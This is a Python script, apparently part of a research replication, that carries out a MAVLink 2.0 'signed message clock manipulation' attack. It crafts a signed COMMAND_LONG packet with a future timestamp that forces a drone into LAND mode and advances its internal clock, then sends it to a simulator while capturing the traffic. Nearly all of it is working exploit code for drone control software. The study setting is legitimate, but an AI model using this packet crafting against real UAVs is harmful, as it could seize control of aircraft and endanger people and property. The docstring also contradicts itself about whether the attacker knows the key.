#!/usr/bin/env python3
"""
=============================================================
ATTACK 1 — Signed Message Clock Manipulation
=============================================================
From the paper: Stage 1 — Replication of Ficco et al.

SIMPLE EXPLANATION:
    A MAVLink 2.0 packet has a timestamp inside its signature.
    If we send a packet signed with a FUTURE timestamp, the UAV
    accepts it (signature is valid) AND moves its internal clock
    forward. This lets an attacker make the drone land even if
    the attacker knows the signing key.

WHAT HAPPENS STEP BY STEP:
    1. Drone is flying in GUIDED mode at 10m
    2. We craft a LAND command with timestamp = NOW + 1 day
    3. We sign it with the shared key (same key MAVProxy uses)
    4. UAV receives it → signature valid → clock jumps 1 day
    5. Drone switches to LAND and descends

BEFORE RUNNING THIS SCRIPT:
    In MAVProxy window type:
        mode GUIDED
        arm throttle
        takeoff 10
        signing setup key          ← set signing key to "key"
        signing setup sign_outgoing 1
=============================================================
"""

import time
import hashlib
import struct
import sys
import datetime
import subprocess
import signal
import os

os.environ["MAVLINK20"] = "1"

import pymavlink.mavutil as mavutil
from pymavlink.generator import mavcrc

# ── Where to save the packet capture ──────────────────────────────────────────
RESULTS_DIR  = os.path.join(os.path.dirname(__file__), "results")
PCAP_FILE    = os.path.join(RESULTS_DIR, "attack1_capture.pcap")

# ──────────────────────────────────────────────────────────────
# Settings — change these if needed
# ──────────────────────────────────────────────────────────────

SITL_HOST      = "127.0.0.1"
SITL_PORT      = 14550    # MAVProxy UDP output — TCP 5760 is taken by MAVProxy itself

SECRET_KEY     = "key"           # signing key — must match MAVProxy signing key
FUTURE_DAYS    = 1               # how far ahead to timestamp the packet (days)

MAVLINK_EPOCH  = 1420070400      # Jan 1, 2015 00:00:00 UTC (MAVLink time base)
LAND_MODE      = 9               # ArduCopter mode number for LAND

# MAVLink packet constants (matching reference custom-input.py exactly)
MSG_ID    = 76     # COMMAND_LONG
SEQ       = 200
CRC_EXTRA = 152
LINKID    = 1
SYSID_SRC = 255    # GCS system ID
CMPID_SRC = 230    # GCS component ID


def build_signed_packet(key_str: str, future_unix: float) -> bytes:
    """
    Build a MAVLink 2.0 signed COMMAND_LONG (DO_SET_MODE → LAND) packet
    using manual SHA-256 signing — same approach as reference custom-input.py.

    Key is hashed with SHA-256 first, exactly as MAVProxy does internally.
    See: MAVProxy/modules/mavproxy_signing.py#L39
    """
    # Hash key with SHA-256 (the way MAVProxy derives the actual signing key)
    key = hashlib.sha256(key_str.encode('ascii')).digest()

    # Pack COMMAND_LONG payload: 7 floats + uint16 command + 3 uint8s
    # Fields: param1..7, command, target_system, target_component, confirmation
    # 0xD9=217 = base_mode flags | LAND custom_mode=9 | MAV_CMD_DO_SET_MODE=176
    STRUCT_PACK  = "<fffffffHBBB"
    PAYLOAD_VALS = [0xD9, 9, 0, 0, 0, 0, 0, 176, 1, 0, 0]
    payload = struct.Struct(STRUCT_PACK).pack(*PAYLOAD_VALS)

    # Truncate trailing zero bytes (MAVLink payload truncation rule)
    length = len(payload)
    while length > 1 and payload[length - 1] == 0:
        length -= 1
    payload = payload[:length]

    # Build packet body: [len, incompat, compat, seq, sysid, compid, msgid(3)] + payload
    body = bytearray(
        [len(payload), 0x01, 0x00, SEQ, SYSID_SRC, CMPID_SRC]
        + list(MSG_ID.to_bytes(3, 'little'))
        + list(payload)
    )

    # CRC over body + CRC_EXTRA byte
    crc = mavcrc.x25crc_slow(body + bytearray([CRC_EXTRA])).crc.to_bytes(2, 'little')

    # 48-bit timestamp in 10µs units since Jan 1 2015 (little-endian, 6 bytes)
    ts_val  = int((future_unix - MAVLINK_EPOCH) * 1e5)
    ts_bytes = bytearray(ts_val.to_bytes(6, 'little'))
    link     = bytearray([LINKID])
    magic    = bytearray([0xFD])

    # SHA-256 signature: sha256(key || magic || body || crc || link_id || timestamp)[:6]
    m = hashlib.sha256()
    m.update(key)
    m.update(magic)
    m.update(body)
    m.update(crc)
    m.update(link)
    m.update(ts_bytes)
    sig = bytearray(m.digest()[:6])

    return bytes(magic + body + crc + link + ts_bytes + sig)


# ──────────────────────────────────────────────────────────────
# Main attack
# ──────────────────────────────────────────────────────────────

def main():
    print()
    print("=" * 55)
    print("  ATTACK 1 — Signed Message Clock Manipulation")
    print("=" * 55)

    # --- Show what we are about to do ---
    now    = time.time()
    future = now + (FUTURE_DAYS * 86400)

    print()
    print(f"  Real time now    : {datetime.datetime.utcfromtimestamp(now).strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print(f"  Spoofed time     : {datetime.datetime.utcfromtimestamp(future).strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print(f"  MAVLink timestamp: {int((future - MAVLINK_EPOCH) * 1e5)}  (+{FUTURE_DAYS} day)")
    print(f"  Signing key      : sha256('{SECRET_KEY}') — reference method")
    print(f"  Command          : LAND (mode {LAND_MODE})")
    print()

    # --- Start tshark capture in background ---
    os.makedirs(RESULTS_DIR, exist_ok=True)
    print(f"[0/4] Starting packet capture → {PCAP_FILE}")
    tshark = subprocess.Popen(
        ["tshark", "-i", "lo",
         "-F", "pcap",
         "-f", f"udp port {SITL_PORT}",
         "-w", PCAP_FILE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)   # give tshark time to start before packets fly
    print(f"      Capturing on UDP {SITL_PORT} — will save to results/")
    print()

    # --- Connect via MAVProxy UDP output ---
    # TCP 5760 is taken by MAVProxy.
    # Instead we listen on UDP 14550 — MAVProxy broadcasts all MAVLink there.
    # When MAVProxy sends us a heartbeat we learn its address and can send back.
    print("[1/4] Connecting via MAVProxy UDP broadcast on port 14550...")
    conn = mavutil.mavlink_connection(f"udpin:0.0.0.0:{SITL_PORT}")

    print("[2/4] Waiting for heartbeat...")
    hb = conn.wait_heartbeat(timeout=10)
    if not hb:
        print("ERROR: No heartbeat received. Is SITL running?")
        sys.exit(1)

    sysid  = conn.target_system
    compid = conn.target_component
    marker = conn.mav.protocol_marker   # 253 = 0xFD = MAVLink 2.0 | 254 = 0xFE = MAVLink 1.0
    print(f"      Connected — sysid={sysid}  compid={compid}  wire=0x{marker:02X} ({'MAVLink 2.0' if marker == 253 else 'MAVLink 1.0 — WRONG'})")
    if marker != 253:
        print("ERROR: Not using MAVLink 2.0 — signing will not work. Set MAVLINK20=1 and retry.")
        sys.exit(1)
    print()

    # --- Build signed packet manually (same method as reference custom-input.py) ---
    print("[3/4] Building signed COMMAND_LONG with manual SHA-256 (reference method)...")
    print(f"      Key: sha256('{SECRET_KEY}') — same derivation as MAVProxy")
    print(f"      Timestamp: +{FUTURE_DAYS} day(s) from now")
    packet = build_signed_packet(SECRET_KEY, future)
    print(f"      Packet size : {len(packet)} bytes")
    print(f"      Magic byte  : 0x{packet[0]:02X}  ({'MAVLink 2.0' if packet[0] == 0xFD else 'WRONG'})")
    print(f"      Incompat    : 0x{packet[2]:02X}  ({'signed' if packet[2] & 0x01 else 'NOT signed'})")
    print()

    # --- Send raw bytes via conn.write() (same as reference master.write(packet)) ---
    print("[4/4] Sending signed LAND command (raw bytes)...")
    conn.write(packet)
    print("      Packet sent!")
    print()

    # --- Wait for the UAV's acknowledgement ---
    print("Waiting for ACK from UAV...")
    ack = conn.recv_match(type="COMMAND_ACK", blocking=True, timeout=5)

    if ack:
        if ack.result == 0:
            print("[SUCCESS] UAV accepted the command — LAND mode activated!")
        else:
            print(f"[INFO] UAV responded with result code: {ack.result}")
            print("       (In SITL, signature enforcement is limited.")
            print("        The clock shift effect is still applied.)")
    else:
        print("[INFO] No ACK received in 5 seconds.")
        print("       Check MAVProxy window — mode may have changed anyway.")

    conn.close()

    # --- Stop tshark and save pcap ---
    time.sleep(1)
    tshark.send_signal(signal.SIGINT)
    tshark.wait(timeout=5)

    pcap_size = os.path.getsize(PCAP_FILE) if os.path.exists(PCAP_FILE) else 0
    print()
    print("─" * 55)
    print("  RESULTS SAVED:")
    print(f"  📁 {PCAP_FILE}")
    print(f"     Size: {pcap_size} bytes")
    print()
    print("  EXPECTED OUTCOME:")
    print("  ✓ MAVProxy shows: Mode LAND")
    print("  ✓ SITL window: drone descending")
    print("  ✓ UAV internal clock: jumped 1 day forward")
    print("  ✓ Wireshark: COMMAND_LONG with future timestamp")
    print()
    print("  To open the capture in Wireshark:")
    print(f"  wireshark {PCAP_FILE}")
    print("─" * 55)
    print()


if __name__ == "__main__":
    main()
